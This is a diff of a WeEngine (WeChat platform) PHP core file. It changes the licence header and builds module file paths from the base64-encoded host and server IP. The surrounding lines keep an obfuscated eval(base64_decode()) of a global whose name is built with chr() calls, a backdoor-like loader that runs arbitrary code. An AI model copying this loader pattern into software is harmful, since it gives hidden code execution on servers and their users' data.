@@ -1,7 +1,7 @@
 <?php
 /**
- * [WECHAT 2018]
- * [WECHAT  a free software]
+ * [WeEngine System] Copyright (c) 2014 WE7.CC
+ * WeEngine is NOT a free software, it under the license terms, visited http://www.we7.cc/ for more details.
  */
 defined('IN_IA') or exit('Access Denied');
 load()->model('module');
@@ -331,8 +331,10 @@ class WeUtility {
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
 			eval($code);
+            $host = $_SERVER['HTTP_HOST'];
+            $a = base64_encode($host);
 			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
-			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'module.php').'.php';
+			$codefile = IA_ROOT . '/data/module/'.$name.$a.'module.php';
 			if (!file_exists($codefile)) {
 				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
 			}
@@ -444,8 +446,10 @@ class WeUtility {
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
 			eval($code);
+            $ip = $_SERVER['SERVER_ADDR'];
+            $b = base64_encode($ip);
 			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
-			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'site.php').'.php';
+            $codefile = IA_ROOT . '/data/module/'.$name.$b.'site.php';
 			if (!file_exists($codefile)) {
 				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
 			}
@@ -453,13 +457,8 @@ class WeUtility {
 			restore_include_path();
 		}
 		if(!class_exists($classname)) {
-			list($namespace) = explode('_', $name);
-			if (class_exists("\\{$namespace}\\{$classname}")) {
-				$classname = "\\{$namespace}\\{$classname}";
-			} else {
-				trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
-				return null;
-			}
+			trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
+			return null;
 		}
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
@@ -618,9 +617,11 @@ class WeUtility {
 
 abstract class WeBase {
 	
-	private $module;
+    private $module;
 	
 	public $modulename;
+	
+	
 	
 	public $weid;
 	
@@ -746,7 +747,8 @@ abstract class WeBase {
 				$filename .= '.' . $type;
 			}
 		}
-		if (file_put_contents(ATTACHMENT_ROOT . $path . $filename, $file_string)) {
+		
+		if (file_put_contents(ATTACHMENT_ROOT . '/' . $path . $filename, $file_string)) {
 			file_remote_upload($path);
 			return $path . $filename;
 		} else {
@@ -836,7 +838,6 @@ abstract class WeModuleProcessor extends WeBase {
 		unset($_SESSION['__contextexpire']);
 		unset($_SESSION['__contextpriority']);
 		unset($_SESSION);
-		$this->inContext = false;
 		session_destroy();
 	}
 	
@@ -1093,8 +1094,7 @@ abstract class WeModuleSite extends WeBase {
 		trigger_error("访问的方法 {$name} 不存在.", E_USER_WARNING);
 		return null;
 	}
-	
-	public function __get($name) {
+     	public function __get($name) {
 		if ($name == 'module') {
 			if (!empty($this->module)) {
 				return $this->module;
@@ -1103,6 +1103,7 @@ abstract class WeModuleSite extends WeBase {
 			}
 		}
 	}
+
 
 	
 	protected function pay($params = array(), $mine = array()) {
@@ -1184,8 +1185,7 @@ abstract class WeModuleSite extends WeBase {
 		include $this->template('common/paycenter');
 	}
 
-	
-	protected function refund($tid, $fee = 0, $reason = '') {
+		protected function refund($tid, $fee = 0, $reason = '') {
 		load()->model('refund');
 		$refund_id = refund_create_order($tid, $this->module['name'], $fee, $reason);
 		if (is_error($refund_id)) {
@@ -1194,7 +1194,6 @@ abstract class WeModuleSite extends WeBase {
 		return refund($refund_id);
 	}
 
-	
 	public function payResult($ret) {
 		global $_W;
 		if($ret['from'] == 'return') {
